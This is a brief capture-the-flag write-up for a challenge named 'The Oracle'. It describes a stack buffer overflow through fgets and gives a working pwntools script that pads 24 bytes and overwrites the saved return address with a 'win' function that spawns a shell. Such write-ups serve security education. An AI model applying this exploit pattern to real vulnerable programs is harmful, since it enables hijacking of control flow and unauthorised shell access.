# The Oracle

This challenge is a short, 16 line program that calls `fgets` and overflows a buffer.

Our input is 24 bytes before the return pointer, so we can write 24 bytes, then overflow the saved return pointer.

The program has a function called `win` that will call `/bin/sh`, so since PIE is disabled, we can overwrite saved rip with its address.

```
from pwn import *

p = process('./theoracle')
e = ELF('./theoracle')

payload = b'A' * 24 + p64(e.symbols['win'])

p.sendline(payload)

p.interactive()
```
